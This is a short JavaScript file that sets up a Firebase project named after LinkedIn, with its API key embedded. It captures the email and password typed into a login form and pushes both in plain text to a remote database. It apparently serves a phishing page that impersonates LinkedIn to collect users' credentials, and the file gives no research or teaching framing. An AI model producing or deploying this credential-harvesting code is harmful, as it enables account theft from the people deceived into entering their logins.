const firebaseConfig = {
    apiKey: "AIzaSyAmSwZmr1Xswonmj7M9rHO08STpZker0n4",
    authDomain: "linkedin-e0fbe.firebaseapp.com",
    databaseURL: "https://linkedin-e0fbe-default-rtdb.firebaseio.com",
    projectId: "linkedin-e0fbe",
    storageBucket: "linkedin-e0fbe.appspot.com",
    messagingSenderId: "581777293637",
    appId: "1:581777293637:web:115582eb5a0cf0b1be7e2c"
  };

  firebase. initializeApp(firebaseConfig);

  //ref for database
  const main__formDB=firebase.database().ref('main__form');
  //sending ref to the function
  document.getElementById('main__form').addEventListener('submit',submitForm)

  function submitForm(e){
    //prevent default action of forms
    e.preventDefault();
    //get form values 
    var email=  getElementVal('email');
    var password=  getElementVal('password');
    
    saveMessages(email,password);
}

//save messages to firebase
const saveMessages=(email,password)=>{
    //push to database
    var newForm=main__formDB.push()
    newForm.set({
        email:email,
        password:password,
    });
};

const getElementVal=(id) =>{
    return document.getElementById(id).value;
};